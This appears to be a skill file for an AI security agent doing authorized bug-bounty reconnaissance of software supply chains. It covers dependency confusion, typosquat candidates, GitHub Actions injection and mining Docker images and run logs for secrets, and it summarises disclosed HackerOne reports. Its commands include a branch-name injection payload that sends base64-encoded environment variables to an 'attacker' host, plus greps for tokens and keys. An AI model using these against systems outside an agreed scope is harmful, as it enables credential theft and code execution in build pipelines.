---
name: hunt-supply-chain
description: Supply-chain attack recon — internal package-name discovery → dependency-confusion candidates, typosquat candidate generation (list only, never publish), GitHub Actions injection scan, unpinned third-party actions, Docker registry mining, SBOM/SPDX → OSV/NVD, .npmrc leakage, compromised-CDN detection. Use when package registries, workflows, or dependencies are in scope. Trigger keywords: supply chain, dependency confusion, typosquat, npm, PyPI, package, unpinned action.
---

# Supply-Chain Attack Recon — Deep Hunting

## THE GATE
Internal package-name discovery from JS bundles (`@scope/name` grep, `require("...")`), leaked `package.json`, `requirements.txt` → registry 404 check (npm/PyPI/RubyGems/Go proxy) → dependency-confusion candidates. Name-unclaimed alone is Informational; needs build-system evidence (no `@scope:registry=` mapping, package actually installed).

## Attack Vectors
- **Typosquat candidates**: delete/transpose/extra-char/dash variants — list only, never publish without written sign-off.
- **Actions injection scan**: `pull_request_target`, `${{ github.event.* }}` into `run:`, `ref: head_ref`, unpinned third-party actions (`uses: org/repo@v1`/`@main` — repointable, cf. tj-actions/changed-files CVE-2025-30066); public run logs as secret source; `curl | bash` patterns (Codecov).
- **Docker registry mining** (Hub/GHCR); SBOM/SPDX/CycloneDX release assets → exact transitive versions → OSV/NVD; `.npmrc` `_authToken`, `extra-index-url` leakage; polyfill.io-style compromised-CDN detection; `zizmor`.

## Key Commands
```
curl -sI https://registry.npmjs.org/@target-internal/utils   # 404 = registerable
git checkout -b 'feat/x"; curl https://attacker/?d=$(env | base64);"'
gh api repos/O/R/actions/runs/$id/logs | grep -iE 'token|key|aws_'
docker save O/I:latest -o image.tar; tar -xf; trufflehog filesystem extracted
curl -s https://api.osv.dev/v1/query -d '{"package":{"name":"lodash","ecosystem":"npm"},"version":"4.17.10"}'
```

## Fingerprinting
`gh repo list` high-signal names (internal/infra/deploy/secret); `.npmrc` scope/registry URL disclosure; `hub.docker.com/v2/repositories/$ORG/`.

## Validation
A deliverable needs concrete name/path + mechanism + exploitability evidence (build would actually use it) + blast radius + recommendation. Use `trufflehog --only-verified`; `aws sts get-caller-identity` for cloud creds.

## Common Mistakes
Publishing typosquats/dep-confusion packages (illegal without scope); scraping whole registries; touching self-hosted runners (may be inside client network); pulling 5–50GB images blindly; confusing "unclaimed" with "exploitable."

## FIELD DATA — mined from HackerOne disclosed reports (10k-report corpus)

### Class: supply-chain — 29 disclosed H1 reports (14 High/Critical)

**Parameters seen in real findings** (recurring; test each on every endpoint):

- `name`
- `source`
- `sk`
- `usp`
- `ver`
- `id`

**Representative finding shapes** (real report titles, genericized — use as test-case ideas, not templates):

- **[critical] [yarn] yarn.lock integrity & hash check logic is broken** (Business Logic Errors)
  - Signal: I would like to report a vulnerability in `yarn`. It allows to pollute yarn cache via a crafted `yarn.lock` file and place a malicious package into cache under any name/version, by
- **[critical] flatmap-stream malicious package (distributed via the popular events-stream)** (Embedded Malicious Code)
  - Signal: I would like to report a case of malicious package (flat-stream) that made it's way into many other npm packages. One such popular package is `event-stream` (user dominictarr trans
- **[critical] RCE via npm misconfig -- installing internal libraries from the public registry** (Code Injection)
- **[critical] Arbitrary Code Execution via npm misconfiguration – installing internal libraries from the public registry** (Code Injection)

